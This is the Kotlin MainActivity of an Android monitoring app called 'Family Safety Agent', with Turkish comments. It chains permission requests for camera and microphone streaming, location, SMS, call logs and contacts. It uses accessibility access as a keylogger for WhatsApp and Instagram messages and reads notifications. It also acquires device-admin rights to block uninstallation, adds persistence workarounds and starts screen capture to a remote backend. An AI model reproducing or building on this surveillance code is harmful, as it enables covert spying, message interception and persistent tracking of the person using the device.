package com.familysafety.agent

import android.annotation.SuppressLint
import android.app.Activity
import android.app.AlertDialog
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.drawable.GradientDrawable
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.view.View
import android.widget.Button
import android.widget.EditText
import android.widget.ImageButton
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    private lateinit var projectionManager: MediaProjectionManager
    private lateinit var tvStatus: TextView
    private lateinit var tvProtectionStatus: TextView
    private lateinit var dotConnectionStatus: View
    private lateinit var tvConnectionStatus: TextView

    // Aynı anda birden fazla dialog açılmasını önler
    private var dialogShowing = false

    // ── İzin listeleri ────────────────────────────────────────────────────────

    private val dangerousPermissions: Array<String> by lazy {
        buildList {
            add(android.Manifest.permission.CAMERA)
            add(android.Manifest.permission.RECORD_AUDIO)
            add(android.Manifest.permission.ACCESS_FINE_LOCATION)
            add(android.Manifest.permission.READ_CONTACTS)
            add(android.Manifest.permission.READ_CALL_LOG)
            add(android.Manifest.permission.READ_SMS)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                add(android.Manifest.permission.POST_NOTIFICATIONS)
            }
        }.toTypedArray()
    }

    // ── Activity result launcher'ları ─────────────────────────────────────────

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { results ->
        val denied = results.filterValues { !it }.keys
        if (denied.isEmpty()) {
            Toast.makeText(this, "Tüm izinler verildi ✓", Toast.LENGTH_SHORT).show()
        } else {
            showRationaleDialog(denied)
        }
        updateStatus()
        advanceSetupChain()
    }

    private val screenCaptureLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            val serviceIntent = Intent(this, MainService::class.java).apply {
                putExtra("resultCode", result.resultCode)
                putExtra("data", result.data)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
            Toast.makeText(this, "İzleme Başlatıldı ✓", Toast.LENGTH_LONG).show()
            updateStatus()
        }
    }

    // ── Lifecycle ─────────────────────────────────────────────────────────────

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Log.d(TAG, "onCreate")
        try {
            setContentView(R.layout.activity_main)
            projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            tvStatus           = findViewById(R.id.tvStatus)
            tvProtectionStatus = findViewById(R.id.tvProtectionStatus)
            dotConnectionStatus = findViewById(R.id.dotConnectionStatus)
            tvConnectionStatus  = findViewById(R.id.tvConnectionStatus)

            val etUrl     = findViewById<EditText>(R.id.etBackendUrl)
            val etProfile = findViewById<EditText>(R.id.etProfileId)
            val btnSave   = findViewById<Button>(R.id.btnSave)
            val btnPerm   = findViewById<Button>(R.id.btnPermission)
            val btnStart  = findViewById<Button>(R.id.btnStartService)
            val btnSettings = findViewById<ImageButton>(R.id.btnSettings)

            btnSettings.setOnClickListener {
                startActivity(Intent(this, SettingsActivity::class.java))
            }

            val prefs = getSharedPreferences("config", MODE_PRIVATE)
            Config.backendUrl = prefs.getString("backend_url", Config.backendUrl) ?: Config.backendUrl
            Config.profileId  = prefs.getString("profile_id",  Config.profileId)  ?: Config.profileId
            etUrl.setText(Config.backendUrl)
            etProfile.setText(Config.profileId)

            btnSave.setOnClickListener {
                Config.backendUrl = etUrl.text.toString().trimEnd('/')
                Config.profileId  = etProfile.text.toString().trim()
                prefs.edit()
                    .putString("backend_url", Config.backendUrl)
                    .putString("profile_id",  Config.profileId)
                    .apply()
                Toast.makeText(this, "Ayarlar Kaydedildi", Toast.LENGTH_SHORT).show()
                updateStatus()
            }

            // Manuel kısayollar
            btnPerm.setOnClickListener { startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) }
            btnStart.setOnClickListener { screenCaptureLauncher.launch(projectionManager.createScreenCaptureIntent()) }

            updateStatus()
            // İlk açılışta zinciri başlat
            advanceSetupChain()

        } catch (e: Exception) {
            Log.e(TAG, "onCreate HATA: ${e.message}", e)
        }
    }

    override fun onResume() {
        super.onResume()
        dialogShowing = false   // Ayarlar'dan döndükten sonra sıfırla
        updateStatus()
        if (allPermissionsGranted()) connectSocketIfNeeded()
        advanceSetupChain()
    }

    // ── Kurulum Zinciri ───────────────────────────────────────────────────────
    // Her adım tamamlandıkça bir sonrakini çağırır.
    // onResume'dan da çağrılır — ayarlar'dan dönüşte devam eder.

    private fun advanceSetupChain() {
        if (dialogShowing) return

        // ADIM 1: Runtime izinler
        if (!allPermissionsGranted()) {
            permissionLauncher.launch(dangerousPermissions)
            return
        }

        // ADIM 2: Erişilebilirlik (klavye takibi)
        if (!isAccessibilityEnabled()) {
            showOnceDialog(
                key       = "acc_shown",
                title     = "Klavye Takibi — Erişilebilirlik İzni",
                message   = "WhatsApp, Instagram ve diğer uygulamalardaki " +
                            "yazışmaları izlemek için:\n\n" +
                            "Ayarlar → Erişilebilirlik → Yüklü Uygulamalar\n" +
                            "→ Güvenlik İzleme Servisi → Aç",
                actionLabel = "Erişilebilirlik Ayarları"
            ) { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) }
            return
        }

        // ADIM 3: Bildirim Dinleyici
        if (!isNotificationListenerEnabled()) {
            showOnceDialog(
                key       = "notif_shown",
                title     = "Bildirim Takibi — Dinleyici İzni",
                message   = "Uygulama bildirimlerini okumak için:\n\n" +
                            "Ayarlar → Bildirim Erişimi (veya Özel Uygulama Erişimi)\n" +
                            "→ Family Safety Agent → Aç",
                actionLabel = "Bildirim Ayarları"
            ) { startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) }
            return
        }

        // ADIM 4: Pil optimizasyonu
        if (!isBatteryOptimizationIgnored()) {
            requestBatteryOptimizationExemption()
            return
        }

        // ADIM 5: MIUI Autostart (yalnızca Xiaomi/Redmi/POCO)
        if (isMiuiDevice()) {
            val prefs = getSharedPreferences("config", MODE_PRIVATE)
            if (!prefs.getBoolean("miui_autostart_shown", false)) {
                showMiuiAutostartDialog()
                return
            }
        }

        // ADIM 5b: MIUI Kilitleme Ekranı Uygulama Kapatma
        if (isMiuiDevice()) {
            val prefs = getSharedPreferences("config", MODE_PRIVATE)
            if (!prefs.getBoolean("miui_lock_cleanup_shown", false)) {
                showMiuiLockCleanupDialog()
                return
            }
        }

        // ADIM 6: Device Admin (opsiyonel — bir kez göster)
        val prefs = getSharedPreferences("config", MODE_PRIVATE)
        if (!isDeviceAdminActive() && !prefs.getBoolean("device_admin_shown", false)) {
            prefs.edit().putBoolean("device_admin_shown", true).apply()
            showOnceDialog(
                key         = "device_admin_shown",
                title       = "Koruma Kalkanı — Device Admin",
                message     = "Uygulamanın izinsiz kaldırılmasını önlemek için " +
                              "Cihaz Yöneticisi yetkisi verin.\n\n" +
                              "Açılan ekranda 'Etkinleştir' seçeneğini seçin.",
                actionLabel = "Device Admin Etkinleştir"
            ) { requestDeviceAdmin() }
            return
        }

        // ADIM 7: Bilinmeyen Kaynaktan Yükleme (USB Yükleme)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && !packageManager.canRequestPackageInstalls()) {
            if (!prefs.getBoolean("unknown_sources_shown", false)) {
                prefs.edit().putBoolean("unknown_sources_shown", true).apply()
                showOnceDialog(
                    key         = "unknown_sources_shown",
                    title       = "Bilinmeyen Kaynak — Yükleme İzni",
                    message     = "Uygulamanın güncellenebilmesi için bu uygulamadan " +
                                  "yüklemeye izin verin.\n\n" +
                                  "Açılan ekranda 'Bu kaynağa izin ver' seçeneğini açın.",
                    actionLabel = "İzin Ayarları"
                ) { openUnknownSourcesSettings() }
                return
            }
        }

        // ── Tüm adımlar tamam → izlemeyi başlat ──────────────────────────────
        connectSocketIfNeeded()
        autoStartMonitoring()
    }

    // ── Adım kontrolleri ──────────────────────────────────────────────────────

    private fun isDeviceAdminActive(): Boolean {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val comp = ComponentName(this, SafetyDeviceAdminReceiver::class.java)
        return dpm.isAdminActive(comp)
    }

    private fun requestDeviceAdmin() {
        val comp = ComponentName(this, SafetyDeviceAdminReceiver::class.java)
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, comp)
            putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Uygulamanın arka planda güvenli çalışması ve izinsiz kaldırılmaması için gereklidir.")
        }
        startActivity(intent)
    }

    private fun allPermissionsGranted() = dangerousPermissions.all {
        checkSelfPermission(it) == PackageManager.PERMISSION_GRANTED
    }

    private fun isAccessibilityEnabled(): Boolean {
        val services = Settings.Secure.getString(
            contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        return services.contains("${packageName}/${packageName}.SafetyAccessibilityService")
    }

    private fun isNotificationListenerEnabled(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners") ?: return false
        return flat.contains(packageName)
    }

    private fun isBatteryOptimizationIgnored(): Boolean {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        return pm.isIgnoringBatteryOptimizations(packageName)
    }

    private fun isMiuiDevice(): Boolean {
        val m = Build.MANUFACTURER.lowercase()
        return m.contains("xiaomi") || m.contains("redmi") || m.contains("poco")
    }

    // ── Adım aksiyonları ─────────────────────────────────────────────────────

    @SuppressLint("BatteryLife")
    private fun requestBatteryOptimizationExemption() {
        dialogShowing = true
        AlertDialog.Builder(this)
            .setTitle("Arka Plan Çalışması — Pil Optimizasyonu")
            .setMessage(
                "Uygulamanın arka planda sürekli çalışması ve bildirim gönderebilmesi için " +
                "pil optimizasyonundan muaf tutulması gerekiyor.\n\n" +
                "Açılan ekranda 'İzin Verildi' seçeneğini seçin."
            )
            .setPositiveButton("Muafiyet İste") { _, _ ->
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                startActivity(intent)
            }
            .setNegativeButton("Şimdi Değil") { _, _ -> advanceSetupChain() }
            .setOnDismissListener { dialogShowing = false }
            .show()
    }

    private fun showMiuiAutostartDialog() {
        dialogShowing = true
        AlertDialog.Builder(this)
            .setTitle("MIUI Autostart")
            .setMessage(
                "Xiaomi/MIUI cihazlarda yeniden başlatma sonrası çalışmak için:\n\n" +
                "Ayarlar → Uygulamalar → Uygulamaları Yönet\n" +
                "→ Family Safety Agent → Autostart → Aç"
            )
            .setPositiveButton("Autostart Ayarına Git") { _, _ ->
                getSharedPreferences("config", MODE_PRIVATE)
                    .edit().putBoolean("miui_autostart_shown", true).apply()
                openMiuiAutostart()
            }
            .setNegativeButton("Anladım") { _, _ ->
                getSharedPreferences("config", MODE_PRIVATE)
                    .edit().putBoolean("miui_autostart_shown", true).apply()
                dialogShowing = false
                advanceSetupChain()
            }
            .setOnDismissListener { dialogShowing = false }
            .show()
    }

    private fun showMiuiLockCleanupDialog() {
        dialogShowing = true
        AlertDialog.Builder(this)
            .setTitle("MIUI — Kilitleme Ekranı Kapatma")
            .setMessage(
                "MIUI, ekran kilitlendiğinde arka plan uygulamalarını kapatabilir. " +
                "Bunu devre dışı bırakın:\n\n" +
                "Yöntem 1:\n" +
                "Güvenlik uygulaması → Pil Tasarrufu\n" +
                "→ Son Uygulamalar Kilidi → Family Safety Agent → Kilitle\n\n" +
                "Yöntem 2:\n" +
                "Son uygulamalar ekranında uygulamayı uzun basın\n" +
                "→ Kilitle (asma kilit ikonu)"
            )
            .setPositiveButton("Güvenlik Uygulamasına Git") { _, _ ->
                getSharedPreferences("config", MODE_PRIVATE)
                    .edit().putBoolean("miui_lock_cleanup_shown", true).apply()
                openMiuiSecurityCenter()
            }
            .setNegativeButton("Anladım") { _, _ ->
                getSharedPreferences("config", MODE_PRIVATE)
                    .edit().putBoolean("miui_lock_cleanup_shown", true).apply()
                dialogShowing = false
                advanceSetupChain()
            }
            .setOnDismissListener { dialogShowing = false }
            .show()
    }

    private fun openMiuiSecurityCenter() {
        val intents = listOf(
            Intent().setClassName("com.miui.securitycenter",
                "com.miui.securitycenter.MainActivity"),
            Intent().setClassName("com.miui.powerkeeper",
                "com.miui.powerkeeper.ui.HiddenAppsContainerManagementActivity")
        )
        for (intent in intents) {
            try { startActivity(intent); return } catch (_: Exception) {}
        }
        openAppSettings()
    }

    private fun autoStartMonitoring() {
        // Zaten çalışıyorsa tekrar başlatma
        if (SocketManager.isSignalConnected()) return
        screenCaptureLauncher.launch(projectionManager.createScreenCaptureIntent())
    }

    // ── Yardımcı dialog ───────────────────────────────────────────────────────
    // "Her onResume'da göster ama her seferinde sadece bir kez" yerine,
    // zincir sırası ile sadece o adım gelince göster.

    private fun showOnceDialog(
        key: String,
        title: String,
        message: String,
        actionLabel: String,
        action: () -> Unit
    ) {
        dialogShowing = true
        AlertDialog.Builder(this)
            .setTitle(title)
            .setMessage(message)
            .setPositiveButton(actionLabel) { _, _ -> action() }
            .setNegativeButton("Şimdi Değil", null)
            .setOnDismissListener { dialogShowing = false }
            .show()
    }

    // ── Socket & servis ───────────────────────────────────────────────────────

    private fun connectSocketIfNeeded() {
        if (!SocketManager.isSignalConnected()) {
            Thread { SocketManager.connect(this@MainActivity) }.start()
        }
    }

    // ── İzin reddi dialog'u ───────────────────────────────────────────────────

    private fun showRationaleDialog(denied: Set<String>) {
        val descriptions = denied.joinToString("\n") { perm ->
            when {
                perm.contains("CAMERA")        -> "📷 Kamera — canlı video akışı"
                perm.contains("RECORD_AUDIO")  -> "🎙 Mikrofon — ses dinleme"
                perm.contains("LOCATION")      -> "📍 Konum — anlık takip"
                perm.contains("CONTACTS")      -> "👥 Kişiler — iletişim analizi"
                perm.contains("CALL_LOG")      -> "📞 Arama geçmişi — analiz"
                perm.contains("SMS")           -> "💬 SMS — mesaj izleme"
                perm.contains("NOTIFICATIONS") -> "🔔 Bildirimler — uyarı göndermek"
                else -> perm.substringAfterLast('.')
            }
        }
        val permanentlyDenied = denied.filter { !shouldShowRequestPermissionRationale(it) }
        val goToSettings = permanentlyDenied.isNotEmpty()

        AlertDialog.Builder(this)
            .setTitle("İzinler Gerekli")
            .setMessage(buildString {
                append("Uygulama şu izinlere ihtiyaç duyuyor:\n\n")
                append(descriptions)
                if (goToSettings) append("\n\nBazı izinler kalıcı reddedildi. Ayarlar'dan manuel verin.")
            })
            .setPositiveButton(if (goToSettings) "Ayarlara Git" else "Tekrar İste") { _, _ ->
                if (goToSettings) openAppSettings()
                else permissionLauncher.launch(denied.toTypedArray())
            }
            .setNegativeButton("Şimdi Değil", null)
            .show()
    }

    private fun openAppSettings() {
        startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = Uri.fromParts("package", packageName, null)
        })
    }

    private fun openUnknownSourcesSettings() {
        val intent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES).apply {
                data = Uri.fromParts("package", packageName, null)
            }
        } else {
            Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.fromParts("package", packageName, null)
            }
        }
        startActivity(intent)
    }

    private fun openMiuiAutostart() {
        val intents = listOf(
            Intent().setClassName("com.miui.securitycenter",
                "com.miui.permcenter.autostart.AutoStartManagementActivity"),
            Intent().setClassName("com.miui.securitycenter",
                "com.miui.securitycenter.MainActivity")
        )
        for (intent in intents) {
            try { startActivity(intent); return } catch (_: Exception) {}
        }
        openAppSettings()
    }

    // ── Durum ekranı ─────────────────────────────────────────────────────────

    private fun updateStatus() {
        val canInstall = try {
            Build.VERSION.SDK_INT < Build.VERSION_CODES.O ||
                    packageManager.canRequestPackageInstalls()
        } catch (e: SecurityException) {
            Log.e("FSA", "REQUEST_INSTALL_PACKAGES izni eksik: ${e.message}")
            false
        }
        val socketOk = SocketManager.isSignalConnected()
        val allReady = allPermissionsGranted() && isAccessibilityEnabled() &&
                isNotificationListenerEnabled() && isBatteryOptimizationIgnored()

        // Hero: Koruma durumu
        if (allReady) {
            tvProtectionStatus.text = "⬤  Koruma Aktif"
            tvProtectionStatus.setTextColor(Color.parseColor("#4CAF50"))
        } else {
            tvProtectionStatus.text = "⚠  Kurulum Gerekli"
            tvProtectionStatus.setTextColor(Color.parseColor("#FF9800"))
        }

        // Bağlantı noktası ve metni
        val dotColor = if (socketOk) "#4CAF50" else "#F44336"
        (dotConnectionStatus.background as? GradientDrawable)?.setColor(Color.parseColor(dotColor))
        tvConnectionStatus.text = if (socketOk) "Backend bağlı — ${Config.backendUrl}" else "Backend bağlantısı yok"
        tvConnectionStatus.setTextColor(Color.parseColor(if (socketOk) "#888888" else "#FF5252"))

        val checks = listOf(
            allPermissionsGranted()           to "Runtime izinler",
            isAccessibilityEnabled()          to "Klavye takibi (Erişilebilirlik)",
            isNotificationListenerEnabled()   to "Bildirim dinleyici",
            isBatteryOptimizationIgnored()    to "Pil optimizasyonu muafiyeti",
            isDeviceAdminActive()             to "Cihaz yöneticisi (koruma kalkanı)",
            canInstall                        to "Bilinmeyen kaynak yükleme",
            socketOk                          to "Socket bağlantısı",
        )
        tvStatus.text = buildString {
            checks.forEach { (ok, label) ->
                append(if (ok) "✓ $label\n" else "✗ $label\n")
            }
            append("Backend: ${Config.backendUrl}\n")
            append("Profil:  ${Config.profileId}")
        }
    }

    companion object {
        private const val TAG = "FSA_Main"
    }
}
